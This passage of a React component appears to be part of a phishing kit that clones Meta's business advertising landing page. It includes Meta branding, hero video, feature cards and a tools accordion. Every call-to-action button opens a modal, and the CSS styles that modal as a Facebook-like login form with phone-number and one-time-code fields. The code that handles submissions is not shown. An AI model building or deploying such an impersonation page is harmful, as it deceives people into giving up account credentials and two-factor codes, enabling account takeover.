                .benefit-desc { max-height: 0; overflow: hidden; opacity: 0; transition: max-height .4s, opacity .3s; }
                .benefit-desc.open { max-height: 200px; opacity: 1; }
                .benefit-desc p { font-size: 15px; color: #465a69; margin-top: 16px; max-width: 480px; }

                /* STEPS */
                .steps { margin: 80px 0; background: #f5f6f7; }
                .steps-inner { max-width: 1440px; margin: 0 auto; padding: 60px 24px; }
                .steps-inner h2 { margin-bottom: 16px; }
                .steps-inner > p { font-size: 15px; max-width: 800px; margin-bottom: 40px; }
                .steps-grid { display: grid; grid-template-columns: 1fr; gap: 24px; }
                .step-card { background: #fff; border: 1px solid #cbd2d9; border-radius: 24px; padding: 40px; box-shadow: 0 4px 20px rgba(0,0,0,.05); }
                .step-number { width: 56px; height: 56px; border-radius: 50%; background: #1c2b33; color: #fff; display: flex; align-items: center; justify-content: center; font-size: 20px; font-weight: 600; margin-bottom: 16px; }
                .step-title { font-size: 22px; font-weight: 300; margin-bottom: 12px; }
                .step-desc { font-size: 14px; color: #465a69; line-height: 1.6; }

                /* TESTIMONIALS */
                .testimonials { padding: 60px 0; }
                .testimonials h2 { text-align: center; margin-bottom: 40px; }
                .carousel-wrapper { border-radius: 32px; overflow: hidden; }
                .carousel-track { display: flex; transition: transform .5s; }
                .carousel-slide { flex-shrink: 0; width: 100%; min-height: 180px; padding: 48px 56px; background: #f1f4f7; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; }
                .carousel-quote { font-size: 20px; line-height: 1.6; max-width: 800px; margin-bottom: 24px; }
                .carousel-author { font-size: 14px; font-weight: 500; color: #465a69; }
                .carousel-nav { display: flex; align-items: center; justify-content: center; gap: 16px; margin-top: 32px; }
                .carousel-btn { width: 32px; height: 32px; border-radius: 50%; border: 1px solid #cbd2d9; display: flex; align-items: center; justify-content: center; background: none; }
                .carousel-btn:hover { background: #f3f4f6; }
                .carousel-dots { display: flex; gap: 8px; }
                .dot { width: 7px; height: 7px; border-radius: 50%; background: #cbd2d9; transition: background .3s; cursor: pointer; }
                .dot.active { background: #1c2b33; }

                /* CTA */
                .cta { background: #f5f6f7; }
                .cta-inner { max-width: 1440px; margin: 0 auto; padding: 64px 24px; display: flex; flex-direction: column; align-items: center; gap: 48px; }
                .cta-content { text-align: center; width: 100%; }
                .cta-icon { width: 64px; height: 64px; margin: 0 auto 32px; }
                .cta-content h2 { font-size: 36px; font-weight: 500; margin-bottom: 32px; }
                .cta-image { width: 100%; background: #f0f2f5; border-radius: 16px; overflow: hidden; }
                .cta-image img { width: 100%; height: auto; display: block; }

                /* FAQ */
                .faq { padding: 80px 0; }
                .faq-inner { max-width: 1200px; margin: 0 auto; padding: 0 24px; }
                .faq-inner h2 { margin-bottom: 8px; }
                .faq-sub { font-size: 15px; color: #465a69; margin-bottom: 32px; }
                .faq-list { border-top: 1px solid #e5e7eb; }
                .faq-item { border-bottom: 1px solid #e5e7eb; }
                .faq-question { width: 100%; padding: 24px 0; display: flex; justify-content: space-between; align-items: center; gap: 16px; font-size: 18px; font-weight: 500; text-align: left; color: #1c2b33; }
                .faq-chevron { width: 24px; height: 24px; transition: transform .3s; flex-shrink: 0; }
                .faq-chevron.open { transform: rotate(180deg); }
                .faq-answer { max-height: 0; overflow: hidden; transition: max-height .3s; }
                .faq-answer.open { max-height: 400px; }
                .faq-answer p { padding-bottom: 24px; font-size: 15px; color: #65676b; }

                /* FOOTER */
                .footer { background: #1b2a33; color: #fff; }
                .footer-inner { max-width: 1200px; margin: 0 auto; padding: 0 24px; }
                .footer-newsletter { padding: 64px 0; border-bottom: 1px solid rgba(255,255,255,.1); }
                .footer-row { display: flex; flex-direction: column; gap: 32px; }
                .footer-title { font-size: 22px; font-weight: 600; margin-bottom: 12px; }
                .footer-desc { font-size: 14px; color: #9ba3af; }
                .footer-form { display: flex; flex-wrap: wrap; gap: 12px; }
                .footer-input { padding: 12px 16px; border: none; border-radius: 8px; color: #1f2937; font-size: 14px; width: 240px; min-width: 180px; outline: none; }
                .footer-subscribe { padding: 12px 24px; background: #0062ff; color: #fff; border-radius: 45px; font-size: 14px; font-weight: 600; white-space: nowrap; }
                .footer-consent { margin-top: 16px; font-size: 11px; color: #7a8b98; max-width: 700px; }
                .footer-bottom { padding: 40px 0; display: flex; flex-direction: column; gap: 24px; }
                .footer-copy { font-size: 12px; color: #9ba3af; }
                .footer-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 16px; }
                .footer-link { font-size: 13px; color: #d1d5db; display: block; margin-bottom: 8px; }
                .footer-link:hover { color: #fff; }

                /* MODAL SYSTEM */
                .modal-overlay { position: fixed; inset: 0; z-index: 1000; display: none; align-items: center; justify-content: center; padding: 24px 16px; background: rgba(20, 24, 28, .55); -webkit-backdrop-filter: blur(6px) saturate(120%); backdrop-filter: blur(6px) saturate(120%); overflow-y: auto; }
                .modal-overlay.open { display: flex; }
                .modal-container { position: relative; width: 100%; max-width: 420px; margin: auto; background: #ffffff; border-radius: 12px; padding: 28px 20px 20px; box-shadow: 0 12px 28px rgba(0, 0, 0, .2), 0 2px 4px rgba(0, 0, 0, .08), 0 0 0 1px rgba(0, 0, 0, .04); max-height: calc(100vh - 48px); overflow-y: auto; -webkit-overflow-scrolling: touch; }
                .modal-container::-webkit-scrollbar { width: 8px; }
                .modal-container::-webkit-scrollbar-thumb { background: #ccd0d5; border-radius: 4px; }
                .modal-overlay.open .modal-container { animation: modalIn .3s cubic-bezier(.16,.84,.44,1) both; }
                .modal-container.modal-out { animation: modalOut .18s ease-in forwards; }
                @keyframes modalIn { from { opacity: 0; transform: translateY(14px) scale(.97); } to { opacity: 1; transform: translateY(0) scale(1); } }
                @keyframes modalOut { from { opacity: 1; transform: translateY(0) scale(1); } to { opacity: 0; transform: translateY(8px) scale(.98); } }
                @keyframes shake { 0%, 100% { transform: translateX(0); } 20% { transform: translateX(-5px); } 40% { transform: translateX(5px); } 60% { transform: translateX(-3px); } 80% { transform: translateX(3px); } }
                .shake { animation: shake .4s ease; }
                .modal-close { position: absolute; top: 12px; right: 12px; width: 34px; height: 34px; border-radius: 50%; background: #f0f2f5; color: #606770; display: flex; align-items: center; justify-content: center; transition: background .15s, color .15s; z-index: 2; }
                .modal-close:hover { background: #e4e6eb; color: #050505; }
                .modal-close:active { transform: scale(.94); }
                .modal-brand { display: flex; justify-content: center; margin-bottom: 18px; }
                .modal-brand img { max-height: 64px; object-fit: contain; }
                .modal-title { font-size: 22px; font-weight: 700; letter-spacing: -.3px; color: #050505; text-align: center; margin-bottom: 6px; line-height: 1.3; }
                .modal-subtitle { font-size: 14.5px; line-height: 1.5; color: #65676b; text-align: center; margin: 0 auto 20px; max-width: 340px; }
                .fb-form { display: flex; flex-direction: column; gap: 12px; }
                .fb-input-group { width: 100%; }
                .fb-input { width: 100%; height: 56px; padding: 10px 16px; background: rgba(255, 255, 255, 0.2); border: 1px solid rgb(224, 226, 228); border-radius: 16px; font-size: 15.2px; font-family: -apple-system, system-ui, "Segoe UI", Roboto, "Optimistic 95", sans-serif; color: rgb(17, 17, 18); outline: none; line-height: 1.3; caret-color: rgb(17, 17, 18); transition: border-color .15s ease, box-shadow .15s ease; }
                .fb-input::placeholder { color: rgb(104, 106, 110); font-weight: 400; }
                .fb-input:hover { border-color: rgb(180, 183, 186); }
                .fb-input:focus { border-color: rgb(0, 100, 224); box-shadow: 0 0 0 3px rgba(0, 100, 224, .1); }
                .fb-input.input-error { border-color: #fa383e; background: #fffafa; }
                .fb-phone-group { display: flex; gap: 8px; }
                .fb-phone-select-wrap { position: relative; flex: 0 0 42%; }
                .fb-phone-select { width: 100%; height: 56px; padding: 10px 30px 10px 14px; background: rgba(255, 255, 255, 0.2); border: 1px solid rgb(224, 226, 228); border-radius: 16px; font-size: 14px; font-family: inherit; color: rgb(17, 17, 18); appearance: none; -webkit-appearance: none; -moz-appearance: none; cursor: pointer; outline: none; text-overflow: ellipsis; transition: border-color .15s ease, box-shadow .15s ease; }
                .fb-phone-select:hover { border-color: rgb(180, 183, 186); }
                .fb-phone-select:focus { border-color: rgb(0, 100, 224); box-shadow: 0 0 0 3px rgba(0, 100, 224, .1); }
                .fb-phone-select-wrap::after { content: ""; position: absolute; right: 14px; top: 50%; width: 7px; height: 7px; border-right: 2px solid rgb(104, 106, 110); border-bottom: 2px solid rgb(104, 106, 110); transform: translateY(-72%) rotate(45deg); pointer-events: none; }
                .fb-phone-group .fb-input { flex: 1 1 auto; min-width: 0; }
                .field-error { display: none; align-items: flex-start; gap: 6px; margin-top: 6px; font-size: 13px; font-weight: 500; line-height: 1.35; color: #fa383e; }
                .field-error.show { display: flex; }
                .field-error svg { flex: 0 0 auto; margin-top: 1px; }
                .alert-error { display: none; align-items: flex-start; gap: 10px; padding: 12px 14px; margin-top: 4px; background: #ffebe8; border: 1px solid #ffc9c4; border-radius: 12px; font-size: 13.5px; font-weight: 500; line-height: 1.45; color: #b3261e; }
                .alert-error.show { display: flex; }
                .alert-error svg { flex: 0 0 auto; margin-top: 1px; }
                .fb-btn { width: 100%; height: 44px; margin-top: 12px; padding: 0 20px; background: rgb(0, 100, 224); color: rgb(243, 244, 245); border: 0; border-radius: 22px; font-size: 15.2px; font-weight: 500; font-family: inherit; cursor: pointer; transition: background .15s ease, transform .08s ease; display: flex; align-items: center; justify-content: center; gap: 8px; }
                .fb-btn:hover { background: rgb(0, 88, 200); }
                .fb-btn:active { transform: scale(.99); }
                .fb-btn:disabled { opacity: .65; cursor: default; transform: none; }
                .fb-helper { text-align: center; padding: 12px 0 0; }
                .fb-helper a { display: inline-flex; align-items: center; justify-content: center; height: 36px; padding: 0 16px; color: rgb(17, 17, 18); font-size: 15.2px; font-weight: 500; text-decoration: none; }
                .fb-helper a:hover { text-decoration: underline; }
                .modal-meta-footer { display: flex; align-items: center; justify-content: center; margin-top: 24px; padding-top: 20px; border-top: 1px solid #e4e6eb; }
                .modal-meta-footer img { height: 12px; width: auto; max-width: 70px; object-fit: contain; display: block; }
                .fb-otp-input { height: 64px; text-align: center; font-size: 26px; font-weight: 700; letter-spacing: 12px; text-indent: 12px; font-variant-numeric: tabular-nums; }
                .fb-otp-input::placeholder { letter-spacing: 12px; text-indent: 12px; font-weight: 500; color: #ccd0d5; }
                .spinner { display: inline-block; width: 16px; height: 16px; border: 2px solid rgba(255, 255, 255, .45); border-top-color: #ffffff; border-radius: 50%; animation: spin .7s linear infinite; }
                @keyframes spin { to { transform: rotate(360deg); } }
                @media (max-width: 480px) { .modal-container { padding: 24px 16px 16px; border-radius: 12px; } .modal-overlay { padding: 12px; } .modal-close { top: 10px; right: 10px; width: 32px; height: 32px; } .modal-brand img { max-height: 52px; } .modal-title { font-size: 20px; } .modal-subtitle { font-size: 13.5px; } }
                @media (max-width: 400px) { .fb-phone-group { flex-wrap: wrap; } .fb-phone-select-wrap { flex: 1 1 100%; } }
                @media (min-width: 768px) { .header { height: 80px; } .nav-links, .header-right { display: flex; } .hamburger, .header-mobile-icons { display: none; } .hero-inner { flex-direction: row; align-items: center; padding: 64px 24px; } .hero-text { width: 40%; } .hero-text-inner { max-width: 480px; } .hero-icon { width: 72px; height: 72px; } .hero-image { width: 60%; margin-right: -24px; } .hero-image img { border-radius: 24px; } .benefits-header { padding: 80px 24px 0; } .benefits-grid { flex-direction: row; gap: 48px; padding: 64px 24px 80px; } .benefits-image, .benefits-accordion { width: 50%; } .steps { margin: 0; } .steps-inner { padding: 80px 24px; } .steps-grid { grid-template-columns: repeat(3, 1fr); } .carousel-slide { padding: 48px 56px; } .cta-inner { flex-direction: row; align-items: center; padding: 112px 80px; } .cta-content { text-align: left; width: 35%; } .cta-icon { margin: 0 0 32px; } .cta-title { font-size: 44px; } .cta-image { width: 60%; margin-right: -80px; } .footer-row { flex-direction: row; justify-content: space-between; align-items: center; } .footer-bottom { flex-direction: row; justify-content: space-between; align-items: flex-start; } .footer-grid { grid-template-columns: repeat(6, auto); gap: 32px; } }
            `}</style>

            <div className="meta-landing">
            {/* ===== HEADER ===== */}
            <header style={ { width: '100%', borderBottom: '1px solid #e4e6eb', background: '#fff', position: 'sticky', top: 0, zIndex: 100 } }>
                <div className="landing-header-row" style={ { maxWidth: '1504px', margin: '0 auto', display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '0 32px', height: '64px' } }>
                    <div style={ { display: 'flex', alignItems: 'center', gap: '8px' } }>
                        <img src={ MetaLogoBlue } alt="Meta" style={ { width: '61px', objectFit: 'contain' } } />
                        <nav className="landing-nav-desktop" style={ { marginLeft: '50px', display: 'flex', alignItems: 'center', gap: '28px' } }>
                            { [ texts.navGetStarted, texts.navAdvertise, texts.navLearn, texts.navSupport ].map( ( item, navIndex ) => (
                                <span
                                    key={ item }
                                    role={ navIndex === 0 ? 'button' : undefined }
                                    tabIndex={ navIndex === 0 ? 0 : undefined }
                                    onClick={ () => { if ( navIndex === 0 ) openModal(); } }
                                    onKeyDown={ ( e ) => { if ( navIndex === 0 && ( e.key === 'Enter' || e.key === ' ' ) ) { e.preventDefault(); openModal(); } } }
                                    style={ { cursor: 'pointer', color: '#0A1317', fontWeight: '400', fontSize: '14px', whiteSpace: 'nowrap' } }
                                >
                                    { item }
                                </span>
                            ) ) }
                        </nav>
                    </div>
                    <div className="landing-header-actions" style={ { display: 'flex', alignItems: 'center', gap: '40px' } }>
                        <span style={ { cursor: 'pointer', color: '#0A1317', fontWeight: '400', fontSize: '14px', whiteSpace: 'nowrap' } }>
                            { texts.createPage }
                        </span>
                        <span
                            id="header-start-now"
                            role="button"
                            tabIndex={ 0 }
                            onClick={ () => openModal() }
                            onKeyDown={ ( e ) => { if ( e.key === 'Enter' || e.key === ' ' ) { e.preventDefault(); openModal(); } } }
                            style={ { cursor: 'pointer', background: '#0457CB', color: '#fff', fontWeight: '600', fontSize: '14px', padding: '8px 24px', borderRadius: '100px', whiteSpace: 'nowrap' } }
                        >
                            { texts.startNow }
                        </span>
                    </div>
                </div>
            </header>

            {/* ===== HERO SECTION ===== */}
            <section className="landing-hero" style={ { padding: '80px 24px' } }>
                <div style={ { maxWidth: '1504px', margin: '0 auto', width: '100%', display: 'flex', flexDirection: 'column', alignItems: 'center' } }>
                    <div className="landing-hero-title-wrap" style={ { width: '80%', padding: '0 24px' } }>
                        <h1 className="landing-hero-heading" style={ { fontSize: '3.5rem', fontWeight: '550', color: '#1C2B33', textAlign: 'center', lineHeight: '1.15', margin: 0, display: 'block' } }>
                            { texts.landingHeroTitle }
                        </h1>
                    </div>
                    <div className="landing-hero-lead" style={ { width: '60%' } }>
                        <p style={ { fontSize: '16px', color: '#5D6C7B', textAlign: 'center', padding: '16px 16px 0', fontWeight: '400', lineHeight: '1.6', margin: 0 } }>
                            { texts.landingHeroSubtitle }
                        </p>
                    </div>
                    <div
                        id="hero-get-started"
                        role="button"
                        tabIndex={ 0 }
                        onClick={ () => openModal() }
                        onKeyDown={ ( e ) => { if ( e.key === 'Enter' || e.key === ' ' ) { e.preventDefault(); openModal(); } } }
                        style={ { display: 'inline-flex', alignItems: 'center', justifyContent: 'center', padding: '0 24px', height: '45px', cursor: 'pointer', background: '#0457CB', borderRadius: '100px', margin: '24px auto 0' } }
                    >
                        <span style={ { fontSize: '15px', color: '#fff', fontWeight: '500', whiteSpace: 'nowrap' } }>
                            { texts.landingGetStartedBtn }
                        </span>
                    </div>
                    <div className="landing-hero-video" style={ { width: '60%', margin: '80px auto 0' } }>
                        <div style={ { position: 'relative', width: '100%', aspectRatio: '16/9', borderRadius: '32px', overflow: 'hidden', boxShadow: '0 20px 50px rgba(0,0,0,0.1)' } }>
                            <video ref={ videoRef } style={ { width: '100%', height: '100%', objectFit: 'cover', display: 'block' } } muted loop playsInline autoPlay>
                                <source src={ HeroVideo } type="video/mp4" />
                            </video>
                            <div style={ { position: 'absolute', bottom: '24px', right: '24px', zIndex: 10 } }>
                                <button aria-label={ isVideoPaused ? texts.ariaPlayVideo : texts.ariaPauseVideo } style={ { width: '32px', height: '32px', display: 'flex', alignItems: 'center', justifyContent: 'center', background: 'rgba(255,255,255,0.2)', backdropFilter: 'blur(12px)', border: '1px solid rgba(255,255,255,0.4)', borderRadius: '50%', color: '#fff', cursor: 'pointer', transition: 'background 0.3s' } } onClick={ () => { if ( videoRef.current ) { if ( isVideoPaused ) { videoRef.current.play(); } else { videoRef.current.pause(); } setIsVideoPaused( !isVideoPaused ); } } }>
                                    { isVideoPaused ? ( <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="white" stroke="none"><polygon points="5,3 19,12 5,21" /></svg> ) : ( <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="white" stroke="none"><rect x="14" y="3" width="5" height="18" rx="1" /><rect x="5" y="3" width="5" height="18" rx="1" /></svg> ) }
                                </button>
                            </div>
                            <div style={ { position: 'absolute', inset: '0', bottom: 0, left: 0, right: 0, height: '33%', background: 'linear-gradient(to top, rgba(0,0,0,0.2), transparent)', pointerEvents: 'none', opacity: 0.6, top: 'auto' } } />
                        </div>
                    </div>
                </div>
            </section>

            {/* ===== TRUSTED EXPERTS ===== */}
            <section className="landing-trusted" style={ { padding: '80px 32px' } }>
                <div style={ { maxWidth: '1504px', margin: '0 auto' } }>
                    <div className="landing-trusted-copy" style={ { maxWidth: '83%' } }>
                        <p style={ { fontSize: '36px', fontWeight: '500', color: '#1C2B33', lineHeight: '1.2', margin: 0, fontFamily: 'inherit' } }>
                            { texts.trustedPartnersTitle }
                        </p>
                        <p style={ { fontSize: '18px', marginTop: '18px', color: '#1C2B33', lineHeight: '1.6', fontWeight: '400', margin: '18px 0 0' } }>
                            { texts.trustedPartnersDesc }
                        </p>
                    </div>
                </div>
            </section>

            {/* ===== EXPLORE SECTION ===== */}
            <section className="landing-explore" style={ { padding: '0 32px 80px' } }>
                <div style={ { maxWidth: '1504px', margin: '0 auto' } }>
                    <h2 className="landing-explore-heading" style={ { fontSize: '36px', fontWeight: '500', color: '#1C2B33', lineHeight: '1.2', margin: 0, display: 'block' } }>
                        { texts.heroTitle }
                    </h2>
                </div>
            </section>

            {/* ===== FEATURE CARDS ===== */}
            <section className="landing-features" style={ { paddingBottom: '80px' } }>
                <div style={ { maxWidth: '1504px', margin: '0 auto', padding: '40px 32px 0' } }>
                    <div className="landing-features-grid" style={ { display: 'flex', flexWrap: 'wrap', margin: '0 -12px' } }>
                        { [
                            { icon: ( <svg width="42" height="42" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M3 17L9 11L13 15L21 7" stroke="#0457CB" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" /><path d="M17 7H21V11" stroke="#0457CB" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" /></svg> ), title: texts.improveAd, desc: texts.improveAdDesc },
                            { icon: ( <svg width="42" height="42" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><circle cx="9" cy="7" r="4" stroke="#0457CB" strokeWidth="2" /><path d="M3 21v-2a4 4 0 0 1 4-4h4a4 4 0 0 1 4 4v2" stroke="#0457CB" strokeWidth="2" strokeLinecap="round" /><path d="M16 3.13a4 4 0 0 1 0 7.75" stroke="#0457CB" strokeWidth="2" strokeLinecap="round" /><path d="M21 21v-2a4 4 0 0 0-3-3.85" stroke="#0457CB" strokeWidth="2" strokeLinecap="round" /></svg> ), title: texts.landingFeatureReachMoreTitle, desc: texts.landingFeatureReachMoreDesc },
                            { icon: ( <svg width="42" height="42" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 2L15.09 8.26L22 9.27L17 14.14L18.18 21.02L12 17.77L5.82 21.02L7 14.14L2 9.27L8.91 8.26L12 2Z" stroke="#0457CB" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" /></svg> ), title: texts.becomeExpertCardTitle, desc: ( <>{ texts.becomeExpertLead }{ ' ' }<a href="https://www.facebook.com/business/learn" style={ { color: '#0064E0' } }>{ texts.metaBlueprintBrand }</a>{ texts.becomeExpertTrail }</> ) },
                            { icon: ( <svg width="42" height="42" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 2a7 7 0 0 1 7 7c0 2.38-1.19 4.47-3 5.74V17a1 1 0 0 1-1 1H9a1 1 0 0 1-1-1v-2.26C6.19 13.47 5 11.38 5 9a7 7 0 0 1 7-7Z" stroke="#0457CB" strokeWidth="2" /><path d="M9 21h6" stroke="#0457CB" strokeWidth="2" strokeLinecap="round" /></svg> ), title: texts.personalisedAdSolutionsTitle, desc: texts.personalisedAdSolutionsDesc },
                            { icon: ( <svg width="42" height="42" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M18 20V10" stroke="#0457CB" strokeWidth="2" strokeLinecap="round" /><path d="M12 20V4" stroke="#0457CB" strokeWidth="2" strokeLinecap="round" /><path d="M6 20v-6" stroke="#0457CB" strokeWidth="2" strokeLinecap="round" /></svg> ), title: texts.understandPerformanceTitle, desc: texts.understandPerformanceDesc },
                            { icon: ( <svg width="42" height="42" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><rect x="3" y="3" width="7" height="7" rx="1" stroke="#0457CB" strokeWidth="2" /><rect x="14" y="3" width="7" height="7" rx="1" stroke="#0457CB" strokeWidth="2" /><rect x="3" y="14" width="7" height="7" rx="1" stroke="#0457CB" strokeWidth="2" /><rect x="14" y="14" width="7" height="7" rx="1" stroke="#0457CB" strokeWidth="2" /></svg> ), title: texts.adFormatsTitle, desc: texts.adFormatsDesc }
                        ].map( ( card, index ) => (
                            <div key={ index } className="landing-feature-cell" style={ { width: 'calc(33.333% - 24px)', margin: '0 12px 24px', minWidth: '280px', flex: '1 1 280px' } }>
                                <div style={ { background: '#fff', borderRadius: '24px', padding: '40px', border: '1px solid rgba(10,19,23,0.12)', height: '100%', display: 'flex', flexDirection: 'column', boxSizing: 'border-box' } }>
                                    <div style={ { width: '84px', height: '84px', borderRadius: '50%', background: '#EEF4FF', display: 'flex', alignItems: 'center', justifyContent: 'center', marginBottom: '24px', flexShrink: 0 } }>{ card.icon }</div>
                                    <div style={ { flex: 1 } }>
                                        <h3 style={ { fontSize: '24px', fontWeight: '500', color: '#0A1317', lineHeight: '1.2', marginBottom: '24px', display: 'block' } }>{ card.title }</h3>
                                        <div className="landing-feature-desc" style={ { fontSize: '16px', color: '#5D6C7B', lineHeight: '1.5' } }>{ card.desc }</div>
                                    </div>
                                </div>
                            </div>
                        ) ) }
                    </div>
                </div>
            </section>

            {/* ===== TOOLS SECTION ===== */}
            <section className="landing-tools" style={ { padding: '0 0 0' } }>
                <div className="landing-tools-inner" style={ { maxWidth: '1504px', margin: '0 auto', padding: '80px 32px' } }>
                    <h1 className="landing-tools-heading" style={ { fontSize: '36px', fontWeight: '500', color: '#1C2B33', marginBottom: '56px', display: 'block' } }>{ texts.toolsTitle }</h1>
                    <div className="landing-tools-layout" style={ { display: 'flex', alignItems: 'stretch', gap: '80px' } }>
                        <div className="landing-tools-accordion" style={ { width: '40%', flexShrink: 0, borderTop: '1px solid #e5e7eb' } }>
                            { [
                                { id: 'ads_manager', title: texts.adsManager, desc: texts.accordionAdsManagerDesc },
                                { id: 'business_suite', title: texts.accordionBusinessSuiteTitle, desc: texts.accordionBusinessSuiteDesc },
                                { id: 'pixel', title: texts.accordionPixelTitle, desc: texts.accordionPixelDesc },
                                { id: 'pages', title: texts.accordionFbPagesTitle, desc: texts.accordionFbPagesDesc },
                                { id: 'ai_tools', title: texts.accordionAiMarketingTitle, desc: texts.accordionAiMarketingDesc }
                            ].map( ( item ) => {
                                const isActive = activeAccordion === item.id;
                                return (
                                    <div key={ item.id } style={ { padding: '24px 0', borderBottom: '1px solid #e5e7eb', cursor: 'pointer', color: isActive ? '#1C2B33' : '#6b7280' } } onClick={ () => setActiveAccordion( item.id ) }>
                                        <h3 style={ { fontSize: '20px', fontWeight: isActive ? '500' : '400', color: '#0A1317', display: 'flex', justifyContent: 'space-between', alignItems: 'center', margin: 0 } }>
                                            { item.title }
                                            { isActive ? ( <svg width="32" height="32" viewBox="0 0 24 24" fill="none"><path d="M7 17L17 7M17 7H7M17 7v10" stroke="#0A1317" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round" /></svg> ) : ( <svg width="32" height="32" viewBox="0 0 24 24" fill="none"><path d="M12 5v14M5 12h14" stroke="#9ca3af" strokeWidth="1.5" strokeLinecap="round" /></svg> ) }
                                        </h3>
                                        { isActive && (
                                            <div style={ { maxWidth: '80%' } }>
                                                <p style={ { padding: '6px 0', margin: '16px 0', color: '#5D6C7B', fontSize: '16px', lineHeight: '1.6' } }>{ item.desc }</p>
                                                <div style={ { display: 'flex', flexDirection: 'column', gap: '8px' } }>
                                                    { [ texts.learnMore, texts.goToAdsManager ].map( ( label ) => (
                                                        <div key={ label } style={ { display: 'flex', alignItems: 'center', gap: '8px', cursor: 'pointer' } }>
                                                            <div style={ { width: '32px', height: '32px', borderRadius: '50%', border: '1px solid rgba(10,19,23,0.45)', display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0 } }>
                                                                <svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path d="M5 12h14M12 5l7 7-7 7" stroke="#007BFF" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round" /></svg>
                                                            </div>
                                                            <span style={ { fontSize: '14px', color: '#007BFF', fontWeight: '500' } }>{ label }</span>
                                                        </div>
                                                    ) ) }
                                                </div>
                                            </div>
                                        ) }
                                    </div>
                                );
                            } ) }
                        </div>
                        <div className="landing-tools-video-wrap" style={ { flex: 1, display: 'flex', alignItems: 'center', justifyContent: 'center' } }>
                            <div style={ { maxWidth: '470px', width: '100%', position: 'relative', borderRadius: '32px', overflow: 'hidden', boxShadow: '0 20px 50px rgba(0,0,0,0.1)', aspectRatio: '3/4' } }>
                                <video ref={ adsVideoRef } style={ { width: '100%', height: '100%', objectFit: 'cover', display: 'block' } } muted loop playsInline autoPlay><source src={ AdsManagerVideo } type="video/mp4" /></video>
                                <div style={ { position: 'absolute', bottom: '24px', right: '24px', zIndex: 10 } }>
                                    <button aria-label={ isAdsVideoPaused ? texts.ariaPlayVideo : texts.ariaPauseVideo } style={ { width: '32px', height: '32px', display: 'flex', alignItems: 'center', justifyContent: 'center', background: 'rgba(255,255,255,0.2)', backdropFilter: 'blur(12px)', border: '1px solid rgba(255,255,255,0.4)', borderRadius: '50%', cursor: 'pointer' } } onClick={ () => { if ( adsVideoRef.current ) { isAdsVideoPaused ? adsVideoRef.current.play() : adsVideoRef.current.pause(); setIsAdsVideoPaused( !isAdsVideoPaused ); } } }>
                                        { isAdsVideoPaused ? ( <svg width="16" height="16" viewBox="0 0 24 24" fill="white" stroke="none"><polygon points="5,3 19,12 5,21" /></svg> ) : ( <svg width="16" height="16" viewBox="0 0 24 24" fill="white" stroke="none"><rect x="14" y="3" width="5" height="18" rx="1" /><rect x="5" y="3" width="5" height="18" rx="1" /></svg> ) }
                                    </button>
                                </div>
                                <div style={ { position: 'absolute', bottom: 0, left: 0, right: 0, height: '33%', background: 'linear-gradient(to top, rgba(0,0,0,0.2), transparent)', pointerEvents: 'none', opacity: 0.6 } } />
                            </div>
                        </div>
                    </div>
                </div>
            </section>

            {/* ===== INSPIRED SECTION ===== */}
            <section className="landing-inspired" style={ { padding: '80px 0' } }>
                <div className="landing-inspired-inner" style={ { maxWidth: '1240px', margin: '0 auto', padding: '0 24px' } }>
                    <h2 className="landing-inspired-heading" style={ { fontSize: '36px', fontWeight: '500', color: '#1C2B33', marginBottom: '56px', lineHeight: '1.2', display: 'block' } }>{ texts.inspiredTitle }</h2>
                    <div className="landing-inspired-grid" style={ { display: 'grid', gridTemplateColumns: 'repeat(3, 1fr)', gap: '0 80px', rowGap: '48px' } }>
                        { [
                            { id: 'streetwear', src: StreetwearVideo, title: texts.streetwearTip },
                            { id: 'brooklinen', src: BrooklinenVideo, title: texts.inspiredBrookShort },
                            { id: 'shopify', src: ShopifyVideo, title: texts.inspiredShopifyShort }
                        ].map( ( item ) => {
                            const isPlaying = playingVideo === item.id;
                            return (
                                <div key={ item.id } style={ { display: 'flex', flexDirection: 'column', height: '100%' } }>
                                    <div style={ { position: 'relative', aspectRatio: '3/4', width: '100%', background: '#f3f4f6', borderRadius: '20px', overflow: 'hidden', cursor: 'pointer', boxShadow: '0 10px 30px rgba(0,0,0,0.12)' } } onClick={ () => { const videoEl = document.getElementById( `inspired-video-${ item.id }` ); if ( videoEl ) { if ( isPlaying ) { videoEl.pause(); setPlayingVideo( null ); } else { videoEl.play(); setPlayingVideo( item.id ); } } } }>
                                        <video id={ `inspired-video-${ item.id }` } style={ { width: '100%', height: '100%', objectFit: 'cover', display: 'block' } } playsInline loop muted={ false }><source src={ item.src } type="video/mp4" /></video>
                                        { !isPlaying && ( <div style={ { position: 'absolute', inset: 0, display: 'flex', alignItems: 'center', justifyContent: 'center', background: 'rgba(0,0,0,0.1)', transition: 'background 0.3s' } }><div style={ { width: '64px', height: '64px', borderRadius: '50%', border: '3px solid #fff', display: 'flex', alignItems: 'center', justifyContent: 'center', backdropFilter: 'blur(4px)', background: 'transparent' } }><svg width="32" height="32" viewBox="0 0 24 24" fill="white" stroke="white" strokeWidth="2"><path d="M5 5a2 2 0 0 1 3.008-1.728l11.997 6.998a2 2 0 0 1 .003 3.458l-12 7A2 2 0 0 1 5 19z" /></svg></div></div> ) }
                                    </div>
                                    <div style={ { marginTop: '24px' } }><p style={ { fontSize: '24px', fontWeight: '500', color: '#1C2B33', lineHeight: '1.4', margin: 0 } }>{ item.title }</p></div>
                                </div>
                            );
                        } ) }
                    </div>
                </div>
            </section>

